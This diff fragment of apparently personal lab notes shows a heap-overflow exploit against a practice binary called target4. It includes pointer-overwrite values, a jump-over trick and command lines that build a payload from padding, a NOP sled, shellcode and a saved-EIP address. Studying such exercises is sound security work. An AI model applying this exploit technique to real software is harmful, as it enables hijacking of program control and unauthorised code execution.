@@ -34,8 +34,8 @@ I set the right pointer to be the address of the saved eip in tmalloc:tfree. (0x
 notes:
 p.left = EIP value, p.right = EIP addr
 EIP = q 
-q.left = 0x41414141
-q.right = 0xBFFFF84C
+q.left = 0x7FEB7FEB -> jump 7f+2 bytes forwards
+q.right = 0xBFFFF84C -> bad instruction
 
 /tmp/target4 $(perl -e 'print "A"x100';perl -e 'print "\x90"x1383';cat shellcode;perl -e 'print "\xA0\x94\x05\x08\x3c\xf2\xff\xbf"';)
 /tmp/target4 $(perl -e 'print "\x7F\xEB"x50';perl -e 'print "\x90"x1383';cat shellcode;perl -e 'print "\xa8\x94\x05\x08\x3c\xf2\xff\xbf"';) -> better
